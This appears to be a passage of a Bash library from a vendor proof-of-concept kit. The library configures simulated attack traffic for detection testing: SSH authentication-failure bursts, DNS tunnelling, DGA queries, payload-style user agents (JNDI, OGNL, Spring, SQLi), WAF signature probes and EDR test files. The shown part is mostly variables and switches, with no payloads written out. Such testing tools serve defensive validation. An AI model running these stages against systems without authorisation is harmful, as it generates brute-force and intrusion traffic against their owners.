# ==============================================================================
# Stellar PoC — Aggressive service-aware follow-up telemetry (sourced library)
# Safe authorized lab use: no exploits, no credential theft, no destruction.
# @stellar-poc-version: 1.2.0
# ==============================================================================

_SCRIPT_DIR_FOLLOWUP="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=stellar_poc_event_sot.sh
[[ -f "${_SCRIPT_DIR_FOLLOWUP}/stellar_poc_event_sot.sh" ]] && source "${_SCRIPT_DIR_FOLLOWUP}/stellar_poc_event_sot.sh"
# shellcheck source=stellar_poc_network_simulators.sh
[[ -f "${_SCRIPT_DIR_FOLLOWUP}/stellar_poc_network_simulators.sh" ]] && source "${_SCRIPT_DIR_FOLLOWUP}/stellar_poc_network_simulators.sh"

FOLLOWUP_INTENSITY="${FOLLOWUP_INTENSITY:-normal}"
CLI_FOLLOWUP_INTENSITY=""
POC_SCENARIO=""
POC_INTENSITY=""
SERVICE_SPIKE=false
SERVICE_SPIKE_SECONDS=60
FORCE_AGGRESSIVE_FOLLOWUP=false
SSH_AUTH_BURST_ENABLED=false
SSH_BURST_ATTEMPTS=150
SSH_BURST_CONCURRENCY=2
SSH_BURST_MINUTES=0
SSH_TARGET_IP=""
SSH_TARGETS_FILE=""
SSH_ATTEMPTS_PLANNED=0
SSH_ATTEMPTS_EXECUTED=0
HTTP_REQUESTS_PLANNED=0
FOLLOWUP_VALIDATION_FAILED=false
STRICT_FOLLOWUP_VALIDATION=false

# Telemetry counters (incremented during follow-up stages)
FOLLOWUP_HTTP_REQUESTS=0
FOLLOWUP_SSH_AUTH_FAILURES=0
FOLLOWUP_SMB_PROBES=0
FOLLOWUP_DNS_QUERIES=0
FOLLOWUP_ACTIONS_TOTAL=0
SERVICES_DISCOVERED_TOTAL=0
SERVICES_USABLE_TOTAL=0
SCAN_ONLY_WARNING=false
HTTP_REQUESTS_ATTEMPTED=0
HTTP_CONNECTED=0
HTTP_FOLLOWUP_ATTEMPTED=0
HTTP_FOLLOWUP_CONNECTED=0
HTTP_RESPONSES_RECEIVED=0
ABNORMAL_USER_AGENT_COUNT=0
RARE_USER_AGENT_COUNT=0
NORMAL_USER_AGENT_COUNT=0
PAYLOAD_USER_AGENT_COUNT=0
UA_SQLI_STYLE_COUNT=0
UA_ENCODING_ABUSE_COUNT=0
UA_COMMAND_STYLE_COUNT=0
THREAT_HUNT_URL_REQUESTS=0
HTTP_403_COUNT=0
HTTP_404_COUNT=0
HTTP_405_COUNT=0
HTTP_200_COUNT=0
HTTP_301_COUNT=0
HTTP_302_COUNT=0
HTTP_401_COUNT=0
HTTPS_200_COUNT=0
HTTPS_301_COUNT=0
HTTPS_302_COUNT=0
HTTPS_401_COUNT=0
HTTPS_403_COUNT=0
HTTPS_404_COUNT=0
HTTPS_405_COUNT=0
HTTP_TARGETS_DISCOVERED=0
HTTP_TARGETS_REACHABLE=0
HTTP_TARGETS_UNREACHABLE=0
HTTPS_TARGETS_DISCOVERED=0
HTTPS_TARGETS_REACHABLE=0
HTTPS_TARGETS_UNREACHABLE=0
WEB_REACH_RAW_HTTP_COUNT=0
WEB_REACH_USABLE_HTTP_COUNT=0
WEB_REACH_CANDIDATE_HTTP_COUNT=0
WEB_REACH_REACHABLE_HTTP_COUNT=0
WEB_REACH_RAW_HTTPS_COUNT=0
WEB_REACH_USABLE_HTTPS_COUNT=0
WEB_REACH_CANDIDATE_HTTPS_COUNT=0
WEB_REACH_REACHABLE_HTTPS_COUNT=0
WEB_REACH_MALFORMED_DROPPED=0
WEB_REACH_DEGRADED_TCP=0
URL_SCAN_DEGRADED_FALLBACK=false
WEB_RESPONSES_RECEIVED=0
WEB_FAILED_RESPONSES=0
WEB_SUCCESS_RESPONSES=0
WEB_FAIL_RATIO=0
UA_TRAVERSAL_STYLE_COUNT=0
UA_JNDI_STYLE_COUNT=0
UA_OGNL_STYLE_COUNT=0
UA_SPRING_STYLE_COUNT=0
WEB_DETECTION_CONFIDENCE="Low"
HTTPS_RESPONSES_RECEIVED=0
HTTPS_CONNECTED=0
HTTPS_REQUESTS_ATTEMPTED=0
HTTPS_SCAN_FAILED_RESPONSES=0
HTTPS_SCAN_SUCCESS_RESPONSES=0
HTTPS_SCAN_FAIL_RATIO=0
HTTP_SCAN_FAILED_RESPONSES=0
HTTP_SCAN_SUCCESS_RESPONSES=0
HTTP_SCAN_FAIL_RATIO=0
HTTP_PROPFIND_COUNT=0
HTTP_OPTIONS_COUNT=0
HTTP_POST_COUNT=0
HTTP_400_COUNT=0
HTTPS_400_COUNT=0
HTTP_SCAN_INTER_REQUEST_SLEEP=0
HTTP_SCAN_RECON_MIN_FAILED=30
HTTP_SCAN_RECON_MIN_FAIL_RATIO=90
IDS_WAF_SIG_PROBE_STATUS="skipped"
IDS_WAF_SIG_TARGET_COUNT=0
IDS_WAF_SIG_ATTEMPTED=0
IDS_WAF_SIG_RESPONSES=0
IDS_WAF_SIG_TRAVERSAL=0
IDS_WAF_SIG_TOMCAT_PUT=0
IDS_WAF_SIG_SPRING_HDR=0
IDS_WAF_SIG_EDR_CMD=0
EDR_STATIC_TEST_ENABLED=true
EDR_EXTENDED_FILES=false
EDR_TEST_CLEANUP=true
EDR_STATIC_STAGE_STATUS=skipped
EDR_TEST_FILES_ATTEMPTED=0
EDR_TEST_FILES_SUCCESS=0
EDR_TEST_QUARANTINE_SUSPECTED=0
EDR_TEST_FILES_FAILED=0
EDR_TEST_REMOTE_OS=unknown
EDR_TEST_DIR=""
EDR_TEST_FILE_PATHS=""
EDR_TEST_WEBSHELL_METHOD=""
EDR_STATIC_TEST_FILES_CREATED=false
WEBSHELL_CHANNEL_BROKEN=false
HTTP_SCAN_TARGET_COUNT=0
HTTP_SCAN_WAVES=1
HTTP_SCAN_WAVE_FAIL_MIN=0
HTTP_SCAN_WAVE_FAIL_MAX=0
HTTP_SCAN_WAVE_SLEEP=0
HTTP_SCAN_WAVE_ATTEMPT_CAP=15
HTTP_SCAN_UNIQUE_URL_TARGET=10
HTTP_SCAN_UNIQUE_URL_RECOMMENDED=10
HTTP_SCAN_WINDOW_SECONDS=30
HTTP_SCAN_WINDOW_MIN_FAILED=0
HTTP_FOLLOWUP_MAX_HOSTS=2
HTTP_FOLLOWUP_URLS_PER_HOST=10
HTTP_FOLLOWUP_MAX_REQUESTS=20
HTTP_FOLLOWUP_DISCOVERED_HOSTS=0
HTTP_FOLLOWUP_SELECTED_HOSTS=0
HTTP_FOLLOWUP_PLANNED_REQUESTS=0
HTTP_FOLLOWUP_CONNECTION_ESTABLISHED=0
DETECTION_WINDOW_BUCKET_SECONDS=300
DETECTION_WINDOW_DNS_QUERIES=250
DETECTION_WINDOW_DNS_WINDOW_SECONDS=90
DETECTION_WINDOW_DGA_NXDOMAIN=300
DETECTION_WINDOW_DGA_WINDOW_SECONDS=90
URL_SCAN_UNIQUE_ATTEMPTED=0
URL_SCAN_UNIQUE_FAILED=0
URL_SCAN_UNIQUE_SUCCESS=0
URL_SCAN_UNIQUE_FAIL_RATIO=0
URL_SCAN_ANOMALY_SCORE=0
HTTP_FOLLOWUP_MODE="unknown"
EXPECTED_HTTP_DETECTION_IMPACT="low"

# External callback / internal fanout / enhanced DNS (correlation chain)
EXTERNAL_CALLBACK_ATTEMPTED=0
EXTERNAL_CALLBACK_CONNECTED=0
EXTERNAL_CALLBACK_RESPONSES=0
EXTERNAL_CALLBACK_FAILED=false
INTERNAL_FANOUT_ATTEMPTED=0
INTERNAL_FANOUT_CONNECTED=0
INTERNAL_FANOUT_RESPONSES=0
DNS_TUNNEL_QUERY_COUNT=300
DNS_QUERIES_PLANNED=0
DNS_A_QUERIES=0
DNS_TXT_QUERIES=0
DNS_AAAA_QUERIES=0
DNS_NXDOMAIN_STYLE=0
DNS_HIGH_ENTROPY_LABELS=0
DNS_TLD_CC_COUNT=0
DNS_TLD_TO_COUNT=0
DNS_TLD_TOP_COUNT=0
DNS_TLD_XYZ_COUNT=0
DNS_EFFECTIVE_TLD_COUNT=0
DNS_CLUSTER_LOCAL_COUNT=0
DNS_POWERAPPS_STYLE_COUNT=0
DNS_SUSPICIOUS_TLD_COUNT=0
DNS_HTTPS_QUERY_COUNT=0
DNS_TOTAL_ENTROPY_STYLE_COUNT=0
NONSTANDARD_PORT_CONNECTIONS=0
CORRELATION_CALLBACK_DONE=false
CORRELATION_OVERLAP_LAUNCHED=false
FANOUT_UA_JNDI_STYLE_COUNT=0
FANOUT_UA_OGNL_STYLE_COUNT=0
FANOUT_UA_SPRING_STYLE_COUNT=0
CORRELATION_BEACON_CYCLES=0
HTTP_URL_GEN_COUNT=0
HTTP_URL_ATTEMPT_COUNT=0
HTTP_URL_COMPLETE_COUNT=0
HTTP_URL_FAIL_COUNT=0
HTTP_URL_SKIP_COUNT=0
CALLBACK_ATTEMPTED_LOGGED=0
CALLBACK_FALLBACK_ACTIVATED=false
INTERNAL_FANOUT_PER_TARGET=36
SSH_AUTH_ATTEMPTED=0
SSH_AUTH_FAILURES_OBSERVED=0
SMB_PROBES_PLANNED=0
SMB_PROBES_ATTEMPTED=0
SMB_PROBES_CONNECTED=0
DNS_QUERIES_ATTEMPTED=0
DNS_RESPONSES_RECEIVED=0
DEGRADED_TELEMETRY=false
HTTP_URL_SCAN_STAGE_STATUS="skipped"
HTTP_URL_SCAN_SELECTED_TARGET=""
HTTP_URL_SCAN_SELECTION_LINE=""
HTTP_URL_SCAN_BEST_TARGET=""
HTTP_URL_SCAN_BEST_SELECTION_LINE=""
HTTP_URL_SCAN_BEST_DETECTION_SCORE=-999999999
HTTP_EMERGENCY_BURST_ACTIVE=false
HTTP_URL_SCAN_RUN_ID="main"
HTTP_URL_GEN_SEQ=0
HTTP_URL_SCAN_EVENTS_LOG=""
DNS_GENERATED_DOMAINS_LOG=""
DNS_GENERATED_FQDN_KEYS=""
HTTP_URL_SCAN_CANDIDATE_COUNT=0
HTTP_URL_SCAN_DETECTION_LIKELIHOOD="low"
HTTP_URL_SCAN_FINAL_REASON=""
HTTP_URL_SCAN_SUMMARY_TOTAL=0
HTTP_URL_SCAN_REAL_FAILED=0
HTTP_URL_SCAN_SYNTHETIC_FAILED=0
HTTP_URL_SCAN_REDIRECT_COUNT=0
HTTP_URL_SCAN_TIMEOUT_COUNT=0
HTTP_URL_SCAN_HTTP_500=0
HTTP_ATTACK_TOTAL_REQUESTS=0
HTTP_ATTACK_PAYLOAD_URL_REQUESTS=0
HTTP_ATTACK_PAYLOAD_UA_REQUESTS=0
HTTP_ATTACK_PAYLOAD_URL_WITH_PAYLOAD_UA=0
HTTP_ATTACK_PAYLOAD_URL_WITH_NORMAL_UA=0
HTTP_UA_COVERAGE_TOTAL=0
HTTP_UA_COVERAGE_PRESENT=0
HTTP_UA_COVERAGE_MISSING=0
HTTP_UA_COVERAGE_PERCENT=0
HTTP_UA_COVERAGE_NORMAL=0
HTTP_UA_COVERAGE_RARE=0
HTTP_UA_COVERAGE_PAYLOAD=0
HTTP_UA_COVERAGE_ABNORMAL=0
HTTP_UA_COVERAGE_REALTIME_TOTAL=0
HTTP_UA_STAGE_COVERAGE_TOTAL=0
HTTP_UA_STAGE_COVERAGE_PRESENT=0
HTTP_UA_STAGE_COVERAGE_MISSING=0
HTTP_UA_STAGE_COVERAGE_PERCENT=0
HTTP_UA_STAGE_COVERAGE_NORMAL=0
HTTP_UA_STAGE_COVERAGE_RARE=0
HTTP_UA_STAGE_COVERAGE_PAYLOAD=0
HTTP_UA_STAGE_COVERAGE_ABNORMAL=0
DETECTION_LIKELIHOOD_URL_SCAN="low"
DETECTION_LIKELIHOOD_MALICIOUS_UA="low"
EXTERNAL_CALLBACK_STATUS="skipped"
INTERNAL_FANOUT_STATUS="skipped"
INTERNAL_FANOUT_TARGETS=0
DNS_TUNNEL_STAGE_STATUS="skipped"
VALIDATION_RESULT="PASS"
VALIDATION_REASON="All follow-up telemetry checks passed"
TELEMETRY_VAL_DNS_TUNNEL="skipped"
TELEMETRY_VAL_DNS_REASON=""
TELEMETRY_VAL_HTTP_URL_SCAN="skipped"
TELEMETRY_VAL_HTTP_REASON=""
TELEMETRY_VAL_EXTERNAL_CALLBACK="skipped"
TELEMETRY_VAL_CALLBACK_REASON=""
TELEMETRY_VAL_NONSTANDARD_PORT="skipped"
TELEMETRY_VAL_NONSTANDARD_REASON=""
TELEMETRY_VAL_DGA_SIMULATION="skipped"
TELEMETRY_VAL_DGA_REASON=""
TELEMETRY_VAL_NEW_TLD="skipped"
TELEMETRY_VAL_NEW_TLD_REASON=""
DNS_LIVE_LOG_VALIDATION="skipped"
DGA_LIVE_LOG_VALIDATION="skipped"
LIVE_LOG_VALIDATION="skipped"
TELEMETRY_VAL_OVERALL="success"
TELEMETRY_VAL_OVERALL_REASON=""
TELEM_DNS_COUNTS=""
TELEM_DGA_COUNTS=""
TELEM_HTTP_COUNTS=""
TELEM_CALLBACK_COUNTS=""
TELEM_NONSTANDARD_COUNTS=""

# DGA Simulation (xdr.ooo NXDOMAIN + live.xdr.ooo resolvable; separate from DNS tunnel)
DGA_SIMULATION_ENABLED=true
DGA_BASE_DOMAIN="xdr.ooo"
DGA_DNS_USER_SERVER=""
DGA_NXDOMAIN_QUERIES=500
DGA_RESOLVABLE_QUERIES=30
DGA_SIM_CHUNK_SIZE=500
DGA_SIM_CHUNK_MIN=500
DGA_SIM_CHUNK_MAX=500
DGA_DNS_SERVER=""
DGA_DNS_SOURCE=""
DGA_DNS_DETAIL=""
DGA_SKIP_REASON=""
DGA_STAGE_STATUS="skipped"
DGA_QUERY_TOOL=""
DGA_TOTAL_QUERIES=0
DGA_QUERIES_PLANNED=0
DGA_NXDOMAIN_COUNT=0
DGA_RESOLVED_COUNT=0
DGA_TIMEOUT_COUNT=0
DGA_ERROR_COUNT=0
DGA_SAME_EFFECTIVE_TLD="no"
DGA_DETECTION_LIKELIHOOD="LOW"
DGA_DETECTION_REASON=""
DGA_GENERATED_COUNT=0
DGA_ENTROPY_SCORE=0
DGA_FINAL_RESULT="skipped"
DGA_LAST_PAYLOAD_BYTES=0
DGA_LAST_WEBSHELL_METHOD=""
DGA_LAST_ROOT_CAUSE=""
DGA_FAILURE_REASON=""
DGA_QUERIES_ATTEMPTED=0
DGA_QUERIES_SENT=0
DGA_FALLBACK_ATTEMPTED=false
DGA_QUERY_GENERATED=0
DGA_QUERY_SENT_COUNT=0
DGA_QUERY_RESPONDED_COUNT=0
DGA_ACTUAL_DNS_QUERIES=0
DGA_ACTUAL_RANDOM_DOMAINS=0
DGA_ACTUAL_NXDOMAIN=0
DGA_SERVER_OBSERVED_QUERIES=0
DGA_INTERNAL_VS_ACTUAL_MISMATCH=no

# DNS New TLD Test (Stellar dns_new_tld / dns_new_tld_sensor — synthetic new-TLD DNS queries only)
DNS_NEW_TLD_ENABLED=true
DNS_NEW_TLD_MIN_DOMAINS=10
DNS_NEW_TLD_DEFAULT_DOMAINS=35
DNS_NEW_TLD_MAX_DOMAINS=50
DNS_NEW_TLD_SKIP_REASON=""
DNS_NEW_TLD_STAGE_STATUS="skipped"
DNS_NEW_TLD_FINAL_RESULT="skipped"
DNS_NEW_TLD_RESOLVER=""
DNS_NEW_TLD_RESOLVER_SOURCE=""
DNS_NEW_TLD_QUERY_TOOL=""
DNS_NEW_TLD_TESTED_DOMAINS=0
DNS_NEW_TLD_TESTED_TLDS=""
DNS_NEW_TLD_UNIQUE_TLDS=0
DNS_NEW_TLD_QUERY_COUNT=0
DNS_NEW_TLD_QUERY_TYPES=""
DNS_NEW_TLD_A_QUERIES=0
DNS_NEW_TLD_AAAA_QUERIES=0
DNS_NEW_TLD_HTTPS_QUERIES=0
DNS_NEW_TLD_TXT_QUERIES=0
DNS_NEW_TLD_SUCCESSFUL_QUERIES=0
DNS_NEW_TLD_FAILED_QUERIES=0
DNS_NEW_TLD_DURATION_SECONDS=0
DNS_NEW_TLD_DETECTION_LIKELIHOOD="LOW"
DNS_NEW_TLD_DETECTION_REASON=""
DNS_NEW_TLD_LAST_PAYLOAD_BYTES=0
DNS_NEW_TLD_LAST_WEBSHELL_METHOD=""
DNS_NEW_TLD_LAST_ROOT_CAUSE=""
DNS_NEW_TLD_GENERATED=0
DNS_NEW_TLD_VALID_FQDNS=0
DNS_NEW_TLD_INVALID_FQDNS=0
DNS_NEW_TLD_ACTUAL_DNS_QUERIES_SENT=0
DNS_NEW_TLD_ACTUAL_DNS_RESPONSES=0
DNS_NEW_TLD_SERVER_OBSERVED_QUERIES=0
DNS_NEW_TLD_INTERNAL_MISMATCH=no
DNS_NEW_TLD_LIVE_LOG_VALIDATION="skipped"
DNS_NEW_TLD_LAST_REMOTE_OUT=""
DNS_NEW_TLD_LAST_REMOTE_PAYLOAD=""

POC_CUSTOMER_LOG=""
POC_CUSTOMER_REPORT=""
POC_CUSTOMER_VALIDATION=""
OVERALL_RESULT=""
FINAL_VAL_SERVICE_DISCOVERY=""
FINAL_VAL_HTTP_FOLLOWUP=""
FINAL_VAL_SSH_FOLLOWUP=""
FINAL_VAL_DNS_TUNNEL=""
FINAL_VAL_DGA=""
FINAL_VAL_BEACON=""
FINAL_VAL_EXTERNAL_CALLBACK=""
DETECTION_CONFIDENCE_OVERALL="low"
DETECTION_SCORE_HTTP_URL_SCAN=0
DETECTION_SCORE_BEACON=0
DETECTION_SCORE_DGA=0
DETECTION_SCORE_DNS_TUNNEL=0
BEACON_LOW_SLOW_ATTEMPTED=0
BEACON_LOW_SLOW_SUCCESS=0
BEACON_LOW_SLOW_FAILED=0
BEACON_BURST_ATTEMPTED=0
BEACON_BURST_SUCCESS=0
BEACON_BURST_FAILED=0
BEACON_CALLBACK_RATIO=0

# DNS Tunnel Simulation (Stellar Cyber dns_tunnel pattern — synthetic lab traffic only)
DNS_TUNNEL_MODE="auto"
DNS_TUNNEL_DOMAIN_SUFFIX="poc-dns-test.local"
DNS_TUNNEL_USER_SERVER=""
DNS_TUNNEL_MAX_QUERIES=300
DNS_TUNNEL_MIN_QUERIES=220
DNS_TUNNEL_SLEEP_MS=50
DNS_TUNNEL_JITTER_MS=150
DNS_TARGET_SERVER=""
DNS_TARGET_SELECTION_SOURCE=""
DNS_TARGET_SELECTION_DETAIL=""
DNS_RESOLVER_SOURCE=""
DNS_STUB_RESOLVER=""
DNS_UPSTREAM_DNS=""
DNS_SELECTED_DNS=""
DNS_RESOLVER_REASON=""
DNS_TUNNEL_FALLBACK_RESOLVER=false
DNS_TUNNEL_SKIP_REASON=""
DNS_TUNNEL_POST_FALLBACK_USED=false
DNS_TUNNEL_LAST_PAYLOAD_BYTES=0
DNS_TUNNEL_LAST_WEBSHELL_METHOD=""
DNS_TUNNEL_LAST_ROOT_CAUSE=""
DNS_TUNNEL_LAST_REMOTE_OUT=""
DNS_TUNNEL_LAST_REMOTE_PAYLOAD=""
DNS_TUNNEL_ENH_ATTEMPTED=0
DNS_TUNNEL_ENH_SUCCESS=0
DNS_TUNNEL_ENH_FAIL=0
DNS_TUNNEL_ENH_NX=0
DNS_TUNNEL_ENH_TIMEOUT=0
DNS_TUNNEL_ENH_RESULT="skipped"
DNS_TUNNEL_ENH_REASON=""
DNS_TUNNEL_FB_USED="no"
DNS_TUNNEL_FB_REASON=""
DNS_TUNNEL_FB_ATTEMPTED=0
DNS_TUNNEL_FB_SUCCESS=0
DNS_TUNNEL_FB_FAIL=0
DNS_TUNNEL_FB_NX=0
DNS_TUNNEL_FB_TIMEOUT=0
DNS_TUNNEL_FB_RESULT="skipped"
DNS_TUNNEL_FINAL_RESULT="failed"
DNS_TUNNEL_FINAL_SUCCESSFUL_MODE="none"
DNS_TUNNEL_FINAL_REASON=""
DNS_TUNNEL_MODE_USED=""
DNS_ENH_SIM_CHUNK_SIZE=15
DNS_ENH_SIM_CHUNK_MIN=10
DNS_ENH_SIM_CHUNK_MAX=20
DNS_TUNNEL_QUERY_TOOL=""
DNS_TUNNEL_FQDN_LEN_SUM=0
DNS_TUNNEL_FQDN_LEN_MAX=0
DNS_TUNNEL_FQDN_COUNT=0
DNS_TUNNEL_GENERATED_FQDN_LIST=""
DNS_GENERATED_DOMAINS=""
DNS_TUNNEL_ENT_SUM=0
CALLBACK_PRECHECK_TCP_OK=no
CALLBACK_PRECHECK_HTTP_OK=no
EXTERNAL_CALLBACK_SKIP_REASON=""
SCRIPT_ISSUE_FLAGS=""
DNS_TUNNEL_LABEL_LEN_SUM=0
DNS_TUNNEL_LABEL_LEN_MAX=0
DNS_TUNNEL_LABEL_COUNT=0
DNS_TUNNEL_SUCCESS_COUNT=0
DNS_TUNNEL_FAILURE_COUNT=0
DNS_TUNNEL_NXDOMAIN_COUNT=0
DNS_TUNNEL_TIMEOUT_COUNT=0
DNS_TUNNEL_APPROX_ENTROPY=0
DNS_TUNNEL_DETECTION_LIKELIHOOD="LOW"
DNS_TUNNEL_DETECTION_REASON=""
DNS_TUNNEL_PAYLOAD_EXAMPLES=""
DNS_TUNNEL_SELECTED_RESOLVER=""
DNS_TUNNEL_RESOLVER_SOURCE=""
DNS_RESOLVER_VALIDATION_RESULT="failed"
DNS_RESOLVER_SELECTED_TYPE="unknown"
DNS_FORWARDER_MODE_UPSTREAM_UNKNOWN="yes"
DNS_TUNNEL_UNIQUE_QUERIES=0
DNS_TUNNEL_RESOLVED_COUNT=0
DNS_TUNNEL_ERROR_COUNT=0
DNS_QUERY_GENERATED=0
DNS_QUERY_SENT_COUNT=0
DNS_QUERY_RESPONDED_COUNT=0
DNS_TUNNEL_ACTUAL_DNS_QUERIES=0
DNS_TUNNEL_ACTUAL_TXT_QUERIES=0
DNS_TUNNEL_ACTUAL_NXDOMAIN=0
DNS_SERVER_QUERY_BASELINE=0
DNS_SERVER_OBSERVED_QUERIES=0
DNS_INTERNAL_VS_ACTUAL_MISMATCH=no
DNS_VISIBILITY_GENERATED=0
DNS_VISIBILITY_SENT=0
DNS_VISIBILITY_RESPONSE=0
DNS_VISIBILITY_TIMEOUT=0
DNS_VISIBILITY_ERROR=0
DNS_VISIBILITY_VALID_SENT=0
DNS_VISIBILITY_VALID_RESPONSE=0
DNS_VISIBILITY_INVALID_SENT=0
DNS_VISIBILITY_INVALID_NXDOMAIN=0
DNS_VISIBILITY_FAILURE_REASON=""
DNS_VISIBILITY_AVG_LATENCY_MS=0
DNS_VISIBILITY_SUCCESS_RATE=0
DNS_VISIBILITY_DECISION=""
DNS_VISIBILITY_UDP53_PROBE=""
DNS_VISIBILITY_TCP53_PROBE=""
DNS_SENSOR_EXPECTED_VISIBILITY="LOW"
HTTP_URL_SCAN_ROOT_CAUSE=""
HTTP_URL_SCAN_SUMMARY_CONNECTED=0
HTTP_URL_SCAN_SUMMARY_RESPONSES=0
HTTP_URL_SCAN_HTTP200=0
HTTP_URL_SCAN_HTTP4XX=0
HTTP_URL_SCAN_HTTP5XX=0
HTTP_URL_SCAN_CURL_EC_6=0
HTTP_URL_SCAN_CURL_EC_7=0
HTTP_URL_SCAN_CURL_EC_28=0
HTTP_URL_SCAN_CURL_EC_35=0
HTTP_URL_SCAN_CURL_EC_56=0
HTTP_URL_SCAN_CURL_EC_OTHER=0

# Per-intensity targets (per host unless noted)
HTTP_FOLLOWUP_REQUESTS=20
SSH_AUTH_FAILURE_TARGET=30
DNS_BURST_COUNT=200
SMB_PROBE_TARGET=10
MIN_HTTP_FOLLOWUP=10
MIN_SSH_AUTH_FAILURES=30
MIN_DNS_QUERIES=100
MIN_SMB_PROBES=10

followup_usage_lines() {
    : # user-facing help is intensity-only in stellar_poc.sh
}

followup_advanced_usage_lines() {
    : # internal/dev options hidden from default --help
}

parse_followup_cli_switches() {
    case "$1" in
        --followup-intensity) FOLLOWUP_INTENSITY="${2:-}"; CLI_FOLLOWUP_INTENSITY="${2:-}"; return 0 ;;
        --service-spike) SERVICE_SPIKE=true; return 0 ;;
        --service-spike-seconds) SERVICE_SPIKE_SECONDS="${2:-}"; SERVICE_SPIKE=true; return 0 ;;
        --force-aggressive-followup) FORCE_AGGRESSIVE_FOLLOWUP=true; return 0 ;;
        --ssh-auth-burst) SSH_AUTH_BURST_ENABLED=true; return 0 ;;
        --ssh-burst-minutes) SSH_BURST_MINUTES="${2:-}"; SSH_AUTH_BURST_ENABLED=true; return 0 ;;
        --ssh-attempts) SSH_BURST_ATTEMPTS="${2:-}"; SSH_AUTH_BURST_ENABLED=true; return 0 ;;
        --ssh-concurrency) SSH_BURST_CONCURRENCY="${2:-}"; SSH_AUTH_BURST_ENABLED=true; return 0 ;;
        --dns-tunnel-mode) DNS_TUNNEL_MODE="${2:-}"; return 0 ;;
        --dns-server) DNS_TUNNEL_USER_SERVER="${2:-}"; return 0 ;;
        --dns-domain-suffix) DNS_TUNNEL_DOMAIN_SUFFIX="${2:-}"; return 0 ;;
        --dns-max-queries) DNS_TUNNEL_MAX_QUERIES="${2:-}"; return 0 ;;
        --dns-sleep-ms) DNS_TUNNEL_SLEEP_MS="${2:-}"; return 0 ;;
        --dns-jitter-ms) DNS_TUNNEL_JITTER_MS="${2:-}"; return 0 ;;
        --enable-dga) DGA_SIMULATION_ENABLED=true; return 0 ;;
        --disable-dga) DGA_SIMULATION_ENABLED=false; return 0 ;;
        --enable-dns-new-tld) DNS_NEW_TLD_ENABLED=true; return 0 ;;
        --disable-dns-new-tld) DNS_NEW_TLD_ENABLED=false; return 0 ;;
        --dga-base-domain) DGA_BASE_DOMAIN="${2:-}"; return 0 ;;
        --dga-dns-server) DGA_DNS_USER_SERVER="${2:-}"; return 0 ;;
        --dga-nxdomain-queries) DGA_NXDOMAIN_QUERIES="${2:-}"; return 0 ;;
        --dga-resolvable-queries) DGA_RESOLVABLE_QUERIES="${2:-}"; return 0 ;;
        --disable-edr-static-test) EDR_STATIC_TEST_ENABLED=false; return 0 ;;
        --edr-extended-files) EDR_EXTENDED_FILES=true; return 0 ;;
        --edr-cleanup) EDR_TEST_CLEANUP=true; return 0 ;;
        --no-edr-cleanup) EDR_TEST_CLEANUP=false; return 0 ;;
    esac
    return 1
}

# --- PoC observability: follow-up decisions, CSV, executive summary ---
POC_RUN_ID=""
POC_EXECUTION_LOG=""
POC_REPORT_CWD=""
POC_OBS_INITIALIZED=false
POC_REPORT_HEADER_WRITTEN=false
POC_REPORT_TIMELINE_HEADER=false
POC_REPORT_DISCOVERY_HEADER=false
POC_REPORT_FOLLOWUP_HEADER=false
POC_OBS_ALIVE_HOSTS=0
POC_FOLLOWUP_ATTEMPTED=0
POC_FOLLOWUP_SKIPPED=0
POC_DISCOVERY_SERVICES_LOG=""
declare -gA POC_SKIP_REASON_COUNTS=()
declare -gA POC_STAGE_START_EPOCH=()
declare -gA POC_FAILURE_REASON_COUNTS=()
declare -gA POC_HTTP_STATUS_COUNTS=()
POC_EVIDENCE_DIR=""
POC_OBS_DEBUG=false

poc_extract_ipv4() {
    printf '%s' "${1:-}" | tr -d '\r\n\033' | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1
}

poc_failure_reason_bump() {
    local reason="$1" n="${2:-1}"
    [[ -n "${reason}" ]] || return 0
    POC_FAILURE_REASON_COUNTS["${reason}"]=$((${POC_FAILURE_REASON_COUNTS["${reason}"]:-0} + n))
}

poc_http_status_bump() {
    local code="$1" n="${2:-1}"
    [[ -n "${code}" ]] || return 0
    POC_HTTP_STATUS_COUNTS["${code}"]=$((${POC_HTTP_STATUS_COUNTS["${code}"]:-0} + n))
}

poc_accumulate_http_scan_status_counts() {
    local cnt_200="$1" cnt_301="$2" cnt_302="$3" cnt_401="$4" cnt_400="$5" cnt_403="$6" cnt_404="$7" cnt_405="$8"
    local cnt_failed="$9" cnt_success="${10}" cnt_attempted="${11}" cnt_responses="${12}"
    cnt_200=$(safe_int "${cnt_200}")
    cnt_301=$(safe_int "${cnt_301}")
    cnt_302=$(safe_int "${cnt_302}")
    cnt_401=$(safe_int "${cnt_401}")
    cnt_400=$(safe_int "${cnt_400}")
    cnt_403=$(safe_int "${cnt_403}")
    cnt_404=$(safe_int "${cnt_404}")
    cnt_405=$(safe_int "${cnt_405}")
    cnt_failed=$(safe_int "${cnt_failed}")
    cnt_success=$(safe_int "${cnt_success}")
    cnt_attempted=$(safe_int "${cnt_attempted}")
    cnt_responses=$(safe_int "${cnt_responses}")
    (( cnt_200 > 0 )) && poc_http_status_bump "200" "${cnt_200}"
    (( cnt_301 > 0 )) && poc_http_status_bump "301" "${cnt_301}"
    (( cnt_302 > 0 )) && poc_http_status_bump "302" "${cnt_302}"
    (( cnt_401 > 0 )) && poc_http_status_bump "401" "${cnt_401}"
    (( cnt_400 > 0 )) && poc_http_status_bump "400" "${cnt_400}"
    (( cnt_403 > 0 )) && poc_http_status_bump "403" "${cnt_403}"
    (( cnt_404 > 0 )) && poc_http_status_bump "404" "${cnt_404}"
    (( cnt_405 > 0 )) && poc_http_status_bump "405" "${cnt_405}"
    (( cnt_failed > 0 )) && poc_failure_reason_bump "HTTP scan failed responses" "${cnt_failed}"
    (( cnt_success > 0 )) && poc_failure_reason_bump "HTTP scan success responses" "${cnt_success}"
    (( cnt_attempted > cnt_responses )) && poc_failure_reason_bump "HTTP timeout/no response" $((cnt_attempted - cnt_responses))
}

safe_poc_accumulate_http_scan_status_counts() {
    local _rc=0
    poc_accumulate_http_scan_status_counts "$@" || _rc=$?
    if (( _rc != 0 )); then
        log_message "WARN" "HTTP scan status aggregate non-fatal error (rc=${_rc}) — URL scan continues" >&2
    fi
    return 0
}

poc_customer_append() {
    local file="$1" line="$2"
    [[ -n "${file}" && -n "${line}" ]] || return 0
    printf '%s\n' "${line}" >> "${file}" 2>/dev/null || true
}

poc_customer_emit_block() {
    local line
    for line in "$@"; do
        [[ -z "${line}" ]] && continue
        poc_obs_append_log "${line}"
